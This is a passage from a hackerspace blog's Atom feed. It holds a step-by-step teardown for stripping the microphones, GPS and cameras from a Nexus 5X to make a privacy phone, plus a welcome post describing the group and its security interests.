        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/DLL_injection&quot;&gt;DLL Injection&lt;/a&gt; &lt;a href=&quot;#fnref:fn-process_injection&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-hooking&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Hooking&quot;&gt;Hooking&lt;/a&gt; &lt;a href=&quot;#fnref:fn-hooking&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;/ol&gt;
        &lt;/div&gt;
      </content>
    </entry>
    <entry>
      <title>Do it yourself Privacy Phone</title>
      <link href="https://digital-selfdefense.net/2019/11/30/Do-It-Yourself-Privacy-Phone.html"/>
      <updated>2019-11-30T11:00:01+01:00</updated>
      <id>https://digital-selfdefense.net/2019/11/30/Do-It-Yourself-Privacy-Phone</id>
      <content type="html">&lt;p&gt;Who doesn’t know that feeling? You are frustrated because you have said the word “OK” and then all of a sudden the “Google Assistant” appears. You scroll through social networks and wonder why Facebook offers you the shoes you just talked about 5 minutes ago. Then you read another article about how apps with third-party libraries like Baidu&lt;sup id=&quot;fnref:fn-baidu&quot;&gt;&lt;a href=&quot;#fn:fn-baidu&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; trick the whole Android operating system and can access your camera, microphone, etc. at any time. The picture of the frustrated Android user worrying about his digital privacy is now complete.&lt;/p&gt;
        &lt;p&gt;I was that Android user few years ago before I decided to fight back in order to regain my privacy. If you now think that this is another tutorial on how to install a custom ROM without “Google Services” then I have to disappoint you. What I really wanted at that time was a hardware solution that wouldn’t contain any spying hardware like GPS, camera and microphone. I chose the Nexus 5X&lt;sup id=&quot;fnref:fn-nexus_5x&quot;&gt;&lt;a href=&quot;#fn:fn-nexus_5x&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; because CopperheadOS&lt;sup id=&quot;fnref:fn-copperhead&quot;&gt;&lt;a href=&quot;#fn:fn-copperhead&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; offers free ROMs for this device and there a some good tutorials on how to remove the spying parts. Without further ado, I read a Nexus 5X teardown and picked the components I wanted to remove.&lt;/p&gt;
        &lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
        &lt;p&gt;I’m not responsible for bricked devices, dead SD Cards or thermonuclear war. Please do some research if you have any concerns about the steps presented in this tutorial!&lt;/p&gt;
        &lt;ul&gt;
        &lt;li&gt;YOU are choosing to make these modifications, and if you point the finger at me for messing up your device, I will laugh at you.&lt;/li&gt;
        &lt;li&gt;YOUR warranty will be void if you tamper with any part of your device / software.&lt;/li&gt;
        &lt;/ul&gt;
        &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
        &lt;p&gt;Finally, the used LG Nexus 5X that I bought online arrived in the mail and it was time to convert it into a privacy phone. Before we start I wanted to say sorry for the blurry pictures! I had way too much coffee that day and my hands were constantly shaking. In the next steps I will show you what needs to be done in order to get rid of the spy components.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/1.jpg&quot; alt=&quot;Figure 1: LG Nexus 5X&quot; title=&quot;LG Nexus 5X&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Besides the phone you will need some tools like the iFixit Toolkit&lt;sup id=&quot;fnref:fn-iFixit&quot;&gt;&lt;a href=&quot;#fn:fn-iFixit&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; (or something similar) in order to follow the steps presented below.&lt;/p&gt;
        &lt;h2 id=&quot;teardown&quot;&gt;Teardown&lt;/h2&gt;
        &lt;p&gt;Step 1: Remove the backcover&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/2.jpg&quot; alt=&quot;Figure 2: Remove the backcover&quot; title=&quot;Remove the backcover&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Step 2: Remove all screws:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/3.png&quot; alt=&quot;Figure 3: Remove all screws&quot; title=&quot;Remove all screws&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Step 3: Remove the middle frame:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/4.png&quot; alt=&quot;Figure 4: Remove the middle frame&quot; title=&quot;Remove the middle frame&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Step 4: Remove the three microphones:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/5.png&quot; alt=&quot;Figure 5: Remove the three microphones&quot; title=&quot;Remove the three microphones&quot; /&gt;
        &lt;img src=&quot;/assets/uploads/2019/11/post2/images/6.png&quot; alt=&quot;Figure 6: Remove the three microphones&quot; title=&quot;Remove the three microphones&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Step 5: Remove GPS, I don’t know the exact name for this little thing:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/7.png&quot; alt=&quot;Figure 7: Remove GPS&quot; title=&quot;Remove GPS&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Step 6: Remove the front- and back camera:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post2/images/8.png&quot; alt=&quot;Figure 8: Remove the front- and back camera&quot; title=&quot;Remove the front- and back camera&quot; /&gt;
        &lt;img src=&quot;/assets/uploads/2019/11/post2/images/9.png&quot; alt=&quot;Figure 9: Remove the front- and back camera&quot; title=&quot;Remove the front- and back camera&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Step 7: Reassemble everything, flash a ROM of your choice (I recommend CopperheadOS) and you’re done!&lt;/p&gt;
        &lt;hr /&gt;
        &lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
        &lt;div class=&quot;footnotes&quot;&gt;
        &lt;ol&gt;
        &lt;li id=&quot;fn:fn-baidu&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://www.ftc.gov/system/files/documents/public_events/1415032/privacycon2019_serge_egelman.pdf&quot;&gt;50 Ways to Leak Your Data&lt;/a&gt; &lt;a href=&quot;#fnref:fn-baidu&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-nexus_5x&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Nexus_5X&quot;&gt;Nexus 5X&lt;/a&gt; &lt;a href=&quot;#fnref:fn-nexus_5x&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-copperhead&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://copperhead.co/&quot;&gt;CopperheadOS&lt;/a&gt; &lt;a href=&quot;#fnref:fn-copperhead&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-iFixit&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://gizmodo.com/this-cheap-20-toolkit-can-open-99-percent-of-your-gadg-1789224245&quot;&gt;iFixit&lt;/a&gt; &lt;a href=&quot;#fnref:fn-iFixit&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;/ol&gt;
        &lt;/div&gt;
      </content>
    </entry>
    <entry>
      <title>Hello, World!</title>
      <link href="https://digital-selfdefense.net/2019/11/30/Hello-World.html"/>
      <updated>2019-11-30T11:00:00+01:00</updated>
      <id>https://digital-selfdefense.net/2019/11/30/Hello-World</id>
      <content type="html">&lt;p&gt;Digital Self-Defense Lab is virtual hackerspace established in november 2019 by a small group of volunteers. We aim to provide a virtual space for people to hack, create, learn, and explore in a safe, welcoming, and accessible environment. In comparison to traditional hackerspaces we don’t require our members to leave their homes in order to participate in our community. The only thing required is a working computer and an internet connection.&lt;/p&gt;
        &lt;p&gt;The founding fathers of Digital Self-Defense Lab have chosen to stay “anonymous” mainly because of privacy concerns. Additionally we belive that &lt;strong&gt;content&lt;/strong&gt; is more important than &lt;strong&gt;people&lt;/strong&gt;, therefore all content is published under “anonymous”.&lt;/p&gt;
        &lt;p&gt;We come from different places but have the same passion for information security, which we love to share with others and that’s the main reason why we founded Digital Self-Defense Lab.&lt;/p&gt;
        &lt;p&gt;Sharing our knowledge with the infosec community is a way of saying thank you to all the great people out there that are spending countless hours in support of the infosec community.&lt;/p&gt;
        &lt;p&gt;In the near future we are planning to grow our virtual hackerspace and expand to all corners of the world. If you like our work, feel free to participate and spread the word. These are the topics that our members are interested in, listed in a alphabetical order:&lt;/p&gt;
        &lt;ul&gt;
        &lt;li&gt;Cryptography&lt;/li&gt;
        &lt;li&gt;Digital Forensics&lt;/li&gt;
        &lt;li&gt;Exploit Development&lt;/li&gt;
        &lt;li&gt;Hardware Hacking&lt;/li&gt;
        &lt;li&gt;Incident Response&lt;/li&gt;
        &lt;li&gt;Lockpicking&lt;/li&gt;
        &lt;li&gt;Malware Analysis&lt;/li&gt;
        &lt;li&gt;OSINT&lt;/li&gt;
        &lt;li&gt;Penetration Testing&lt;/li&gt;
        &lt;li&gt;Privacy and Anonymity&lt;/li&gt;
        &lt;li&gt;Programming&lt;/li&gt;
        &lt;li&gt;Reverse Engineering&lt;/li&gt;
        &lt;li&gt;Security Research&lt;/li&gt;
        &lt;li&gt;Threat Intelligence&lt;/li&gt;
        &lt;/ul&gt;
        &lt;p&gt;If you are interested in any of the topics above you should consider joining us! Keep in mind that you don’t have to be an subject matter expert in any of the mentioned topics in order to join us. The only thing we require from our members is respectful behaviour towards other members and the willingness to constantly learn and share knowledge.&lt;/p&gt;
        &lt;p&gt;Do you want to join Digital Self-Defense Lab? &lt;a href=&quot;/#contact&quot;&gt;CLICK HERE&lt;/a&gt;&lt;/p&gt;
        &lt;p&gt;See you soon!&lt;/p&gt;
        &lt;hr /&gt;
        &lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
      </content>
    </entry>
  </feed>